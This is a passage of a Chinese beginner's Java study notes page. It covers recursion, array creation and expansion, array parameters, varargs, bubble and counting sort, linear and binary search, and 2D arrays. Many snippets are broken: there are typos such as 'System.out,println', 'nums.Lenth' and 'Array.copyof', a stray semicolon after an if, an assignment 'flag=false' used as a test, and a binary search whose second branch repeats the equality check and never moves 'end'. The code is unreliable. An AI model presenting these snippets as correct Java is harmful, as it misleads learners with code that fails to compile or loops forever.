class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-start&quot;</span>);</span><br><span class="line">        m2();</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m2-start&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;m2-end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>先执行m1,再执行m2,然后执行m1后续</p><h4 id="无穷递归"><a href="#无穷递归" class="headerlink" title="无穷递归"></a>无穷递归</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        m1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-start&quot;</span>);</span><br><span class="line">        m1();</span><br><span class="line">        System.out.println(<span class="string">&quot;m1-end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>此时会无限调用m1,导致方法栈溢出，报错</p><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b0cb657.png" alt="image-20240325094945449"></p><p>递归阶乘</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b4e0411.png" alt="image-20240325095147430"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> f(<span class="number">5</span>);</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n==<span class="number">1</span>?<span class="number">1</span>:n*f(n-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>if同理</p><p>递归：斐波那契数列</p><p>后面的数是前两个数之和：1 1 2 3 5 8 13 21 34 55 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> num=getRabit(<span class="number">20</span>);</span><br><span class="line">        System.out,println(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getRabit</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n==<span class="number">1</span>||n==<span class="number">2</span>?<span class="number">1</span>:getRabit(n-<span class="number">1</span>)+getRabit(n-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>一组连续的存储空间，存储多个相同数值类型的值</p><p><strong>创建：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">先声明 再分配空间：</span><br><span class="line">    数据类型[] 数组名；</span><br><span class="line">    数组名=<span class="keyword">new</span> 数据类型[长度]；</span><br><span class="line">    <span class="type">int</span>[] a;</span><br><span class="line">    a=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>]<span class="comment">//5表示内存大小为5</span></span><br><span class="line">        </span><br><span class="line">声明并分配空间：</span><br><span class="line">    数据类型[] 数组名=<span class="keyword">new</span> 数据类型[长度]；</span><br><span class="line">    <span class="type">int</span>[] a= <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];  </span><br><span class="line"></span><br><span class="line">声明并赋值<span class="number">1</span>：</span><br><span class="line">    数据类型[] 数组名=<span class="keyword">new</span> 数据类型[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;；<span class="comment">//此时[]内不写 </span></span><br><span class="line">    <span class="type">int</span>[] a=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">声明并赋值<span class="number">2</span>：</span><br><span class="line">    数据类型[] 数组名=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;；<span class="comment">//显示初始化 但不能换行</span></span><br><span class="line">    <span class="type">int</span>[] a=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b0600c7.png" alt="image-20240327113352733"></p><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>遍历：从头至尾，逐一对数组的每个元素进行访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">            System.out.println(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b3802f9.png" alt="image-20240327114047818"></p><p><strong>默认值：</strong></p><p>默认值会根据数据类型的不同而改变</p><p>int–&gt;0</p><p>double–&gt;0.0</p><p>boolean–&gt;false</p><p>char–&gt;-\u000  </p><p>其他(引用类型)–&gt;null</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求平均值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">sum += nums[i];</span><br><span class="line">        System.out.println(sum/nums.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输入一个数 判断是否在数组中</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>&#125;;</span><br><span class="line">Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> input.nextInt;</span><br><span class="line"><span class="type">boolean</span> flag=<span class="literal">false</span><span class="comment">//先默认这个值不存在</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line"><span class="keyword">if</span>(nums[i]==num);&#123;</span><br><span class="line">System.out.println(i);</span><br><span class="line">    flag=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag=<span class="literal">false</span>)&#123;</span><br><span class="line">System.out.println(<span class="number">666</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>length属性是只读权限 不能赋值</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae6ea1f.png" alt="image-20240403105542687"></p><p>所以扩容就是创建一个新数组然后把旧数组的值重新传进来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组的扩容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>,<span class="number">55</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] newNums=<span class="keyword">new</span> <span class="title class_">int</span>[nums.length*<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">newNums[i]=nums[i];<span class="comment">//将nums中的值赋给newNums</span></span><br><span class="line">    &#125;</span><br><span class="line">        nums=newNums;</span><br><span class="line">System.out.println(Arrays.toString(nums))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>nums&#x3D;newNums;</p><p>因为数组是引用类型，所以在声明数组时会在堆中开辟一段空间 将nums的地址指向这个堆空间</p><p>而将nums&#x3D;newNums;此时是进行栈操作，将nums的地址指向newNums的堆空间 进而实现数组的拓展</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad00c87.png" alt="image-20240403110950666"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af60c93.png" alt="image-20240403111435499"></p><p>复制的方法：<br><img src="https://bu.dusays.com/2024/05/13/6641a4ae83cbc.png" alt="image-20240403111043343"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组的扩容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        nums=Array.copyof(nums,nums.length*<span class="number">2</span>);</span><br><span class="line"><span class="comment">//要调用这个拓展了的数组 因为它是以返回值的形式返回</span></span><br><span class="line">System.out.println(Arrays.toString(nums))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组型参数与返回值"><a href="#数组型参数与返回值" class="headerlink" title="数组型参数与返回值"></a>数组型参数与返回值</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">add(nums);</span><br><span class="line">System.out.println(Arrays.toString(nums))</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出2，3，4，5，6，7</span></span><br></pre></td></tr></table></figure><p>因为这里当数组作为一个参数时，方法会获取他<strong>堆地址进行操作</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="comment">//add(nums);</span></span><br><span class="line"><span class="comment">//System.out.println(Arrays.toString(nums))</span></span><br><span class="line">        expand(nums);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">expand</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line">nums=Arrays.copyof(nums,nums.Lenth*<span class="number">2</span>);</span><br><span class="line">System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时会输出已扩展的nums</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="comment">//add(nums);</span></span><br><span class="line"><span class="comment">//System.out.println(Arrays.toString(nums))</span></span><br><span class="line">        expand(nums);</span><br><span class="line">        System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">expand</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line">nums=Arrays.copyof(nums,nums.Lenth*<span class="number">2</span>);</span><br><span class="line"><span class="comment">//System.out.println(Array.toString(nums));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时会输出为扩展的nums</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//因为expand方法中有一个形参-&gt;nums 但这其实不是nums数组，形参是互补影响的，所以这里其实是在调用expand方法时，会在堆中重新开辟一段空间，此时形参nums(叫其他的也是一样的)的地址会指向nums数组的堆地址，赋值到形参的地址，扩容，但在调用完成后会销毁这个地址（因为没用），所以如果查看nums数组时，会仍指向原地址，就没扩容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//解决</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] nums=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="comment">//add(nums);</span></span><br><span class="line"><span class="comment">//System.out.println(Arrays.toString(nums))</span></span><br><span class="line">        nums=expand(nums);<span class="comment">//接收</span></span><br><span class="line">        System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] expand(<span class="type">int</span>[] nums)&#123;<span class="comment">//将返回值类型改为数组</span></span><br><span class="line">nums=Arrays.copyof(nums,nums.Lenth*<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;<span class="comment">//返回地址</span></span><br><span class="line"><span class="comment">//System.out.println(Array.toString(nums));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可变长参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>...nums)</span>&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可变长参数其实就是未封装的数组</p><p>但可变长参数只能在<strong>最后一个形参处</strong>调用</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b42e56e.png" alt="image-20240403114621699"></p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>排序的目的是为了方便数据的查找</p><p>有10种排序方法</p><blockquote><p>冒泡排序  选择排序  插入排序    n*n</p><p>快速排序  堆排序    希尔排序  归并排序     n*log2n</p><p>桶排序    计数排序  计数排序</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//冒泡排序：相邻的两个数值比较大小 互换位置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">56</span>,<span class="number">84</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">8</span>&#125;;</span><br><span class="line">bubbleSort(nums);</span><br><span class="line">System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span>[] nums)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length-<span class="number">1</span>;i++)&#123;<span class="comment">//外层循环控制轮数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums.length-<span class="number">1</span>-i;j++)&#123;<span class="comment">//内层循环控制每轮比较次数  比过的就不用再比了</span></span><br><span class="line"><span class="comment">//相邻比较 交换顺序</span></span><br><span class="line"><span class="keyword">if</span>(nums[j]&lt;nums[j+<span class="number">1</span>])&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[j];</span><br><span class="line">nums[j]= nums[j+<span class="number">1</span>];</span><br><span class="line">nums[j+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//选择排序：固定值与其他值依次比大小，互换位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//jdk排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">56</span>,<span class="number">84</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">8</span>&#125;;</span><br><span class="line">Arrays.sort(nums);<span class="comment">//默认升序排序</span></span><br><span class="line">System.out.println(Array.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计数排序 用于特定环境 连续区间</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">1</span>，<span class="number">2</span>，<span class="number">4</span>，<span class="number">3</span>，<span class="number">2</span>，<span class="number">4</span>，<span class="number">1</span>，<span class="number">3</span>，<span class="number">4</span>，<span class="number">2</span>&#125;;</span><br><span class="line"><span class="comment">//&#123;2，3，2，3&#125;描述数组 2个1 3个2 2个3 3个4</span></span><br><span class="line"><span class="comment">//&#123;1，1，2，2，2，3，3，4，4，4&#125;排序</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] counts=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];<span class="comment">//&#123;0,0,0,0&#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;<span class="comment">//描述数组构建</span></span><br><span class="line">counts[nums[i]-<span class="number">1</span>]++;<span class="comment">//映射赋值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] newNums=<span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line"><span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;counts.length;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;counts[i];j++)&#123;</span><br><span class="line"><span class="comment">//还原数组</span></span><br><span class="line">newNums[index++]=i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">nums=newNums;</span><br><span class="line">System.out.println(Arrays.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[] nums = &#123;<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">35</span>,<span class="number">48</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> index=getNum(nums,num);</span><br><span class="line">System.out.println(index);</span><br><span class="line"></span><br><span class="line">Array.sort(nums);</span><br><span class="line"><span class="type">int</span> index=binarySearch(nums,num);</span><br><span class="line"><span class="comment">//也可以直接 int index=Array.binarySearch(nums,num);</span></span><br><span class="line">System.out.println(index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序查找 一个一个找</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> num)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(nums[i]==num)&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二分查找 一半一半找 前提是数据有序的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> num)</span>&#123;</span><br><span class="line"><span class="type">int</span> begin=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> end=nums.length-<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> mid;</span><br><span class="line"><span class="keyword">while</span>(begin&lt;=end)&#123;</span><br><span class="line">mid=(begin+end)/<span class="number">2</span> <span class="comment">//取中点下标</span></span><br><span class="line"><span class="keyword">if</span>(nums[mid]==num)&#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]==num)&#123;<span class="comment">//说明查找元素再前半部分</span></span><br><span class="line"><span class="comment">//end 前移</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//begin 后移</span></span><br><span class="line">begin=mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>概念：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7ca921.png" alt="image-20240408094100540"></p><p>赋值：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b4d363d.png" alt="image-20240408094336997"></p><p>内存分配</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b312822.png" alt="image-20240408094458848"></p><p>访问：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b562afa.png" alt="image-20240408094607893"></p><p>声明：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b2e835e.png" alt="image-20240408094741389"></p><p><strong>高维长度是必要的 低维长度可要可不要</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[][]nums=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,&#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums,length;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums[i].length;j++)&#123;</span><br><span class="line">System.out.println(nums[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 